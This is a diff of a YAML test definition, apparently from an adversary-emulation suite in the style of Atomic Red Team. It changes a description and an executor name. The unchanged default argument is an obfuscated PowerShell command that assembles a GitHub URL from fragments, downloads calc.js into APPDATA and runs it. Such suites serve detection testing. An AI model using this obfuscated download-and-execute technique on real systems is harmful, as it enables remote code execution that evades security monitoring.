@@ -75,16 +75,15 @@ atomic_tests:
     -   windows
     input_arguments:
         powershell_cmd:
-            description: Powershell command to execute
+            description: Powershell.exe command to execute
             type: String
             default: |
                 (NEw-Ob`j`E`ct System.""""Net"""".""""WebClient"""").\"D`ow`Nl`oa`D`F`iLE\"(((\"{1}{0}{2}\" -f 'ps:','htt','/')+'/'+'r'+'a'+(\"{0}{1}\" -f'w.githu','b')+'u'+'se'+(\"{0}{1}\"-f'rc','on')+'te'+(\"{1}{0}\" -f 'c','nt.')+'om/'+(\"{0}{1}\" -f'Cy','bo')+'rgS'+'ec'+(\"{1}{0}\"-f 't','uri')+(\"{1}{0}\"-f 'ato','y/')+(\"{0}{1}\" -f'mic-re','d-t')+(\"{0}{1}\" -f 'eam','/')+(\"{2}{0}{1}\"-f 'y','borg','C')+(\"{3}{0}{2}{1}\"-f 'omics/T','9.','105','/at')+'0'+(\"{3}{0}{1}{2}\"-f '/cal','c.j','s','01')),$env:APPDATA +(('9'+'Cpc'+(\"{1}{0}\" -f's','alc.j'))  -rEPLACE([cHAR]57+[cHAR]67+[cHAR]112),[cHAR]92)); sTAr`T-`Pro`ceSs ($env:APPDATA + (('{0'+'}calc.js')-f[CHAR]92))
     executor:
         command: |
             cMD  /C PowerShELl -NoPR  #{powershell_cmd}
-        name: powershell
+        name: command_prompt
         elevation_required: false
-
 -   name: Powershell invoke mshta.exe download
     auto_generated_guid: 8a2ad40b-12c7-4b25-8521-2737b0a415af
     description: |
